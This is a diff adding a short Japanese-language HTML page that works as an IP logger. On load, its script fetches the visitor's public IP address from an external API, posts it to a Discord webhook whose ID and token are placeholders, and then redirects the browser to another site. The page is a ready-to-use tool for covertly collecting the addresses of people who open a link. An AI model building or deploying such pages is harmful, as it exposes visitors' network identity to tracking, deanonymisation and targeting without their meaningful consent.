@@ -1,1 +1,46 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP送信とリダイレクト</title>
+</head>
+<body>
+    <h1>IPアドレスをDiscordに送信し、リダイレクトします...</h1>
+    <script>
+        // Discord WebhookのURL
+        const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+        
+        // IPアドレスを取得する外部API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
 
+                // Discord Webhookに送信するデータ
+                const payload = {
+                    content: `アクセスしたIPアドレス: ${ipAddress}`
+                };
+
+                // DiscordにIPアドレスを送信
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(() => {
+                    // 送信が完了したらリダイレクト
+                    window.location.href = "https://www.example.com";
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            })
+            .catch(error => {
+                console.error('IPアドレスの取得に失敗しました:', error);
+            });
+    </script>
+</body>
+</html>
